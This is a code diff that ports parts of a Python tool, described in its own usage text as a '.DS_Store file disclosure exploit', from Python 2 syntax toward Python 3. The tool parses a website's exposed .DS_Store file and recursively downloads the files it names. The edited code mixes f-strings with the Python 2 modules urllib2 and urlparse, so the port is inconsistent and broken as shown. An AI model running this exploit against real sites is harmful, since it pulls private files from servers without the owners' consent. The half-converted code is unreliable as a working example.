@@ -42,14 +42,14 @@ class Scanner(object):
                     self.processed_url.add(url)
                 base_url = url.rstrip('.DS_Store')
                 if not url.lower().startswith('http'):
-                    url = 'http://%s' % url
+                    url = f'http://{url}'
                 schema, netloc, path, _, _, _ = urlparse.urlparse(url, 'http')
                 try:
                     response = urllib2.urlopen(url, context=context)
-                except Exception, e:
+                except Exception as e:
                     if hasattr(e, 'code') and  e.code != 404:
                         self.lock.acquire()
-                        print '[%s] %s' % (e.code, url)
+                        print(f'[{e.code}] {url}')
                         self.lock.release()
                     continue
 
@@ -61,7 +61,7 @@ class Scanner(object):
                         os.makedirs(folder_name)
                     with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                         self.lock.acquire()
-                        print '[%s] %s' % (response.code, url)
+                        print(f'[{response.code}] {url}')
                         self.lock.release()
                         outFile.write(data)
                     if url.endswith('.DS_Store'):
@@ -79,7 +79,7 @@ class Scanner(object):
                         d.close()
             except Exception as e:
                 self.lock.acquire()
-                print '[!] %s' % str(e)
+                print(f'[!] {str(e)}')
                 self.lock.release()
             finally:
                 self.working_thread -= 1
@@ -94,10 +94,10 @@ class Scanner(object):
 
 if __name__ == '__main__':
     if len(sys.argv) == 1:
-        print 'A .DS_Store file disclosure exploit.'
-        print 'It parses .DS_Store and downloads file recursively.'
-        print
-        print '    Usage: python ds_store_exp.py http://www.example.com/.DS_Store'
+        print('A .DS_Store file disclosure exploit.')
+        print('It parses .DS_Store and downloads file recursively.')
+        print()
+        print('Usage: python ds_store_exp.py http://www.example.com/.DS_Store')
         sys.exit(0)
     s = Scanner(sys.argv[1])
     s.scan()
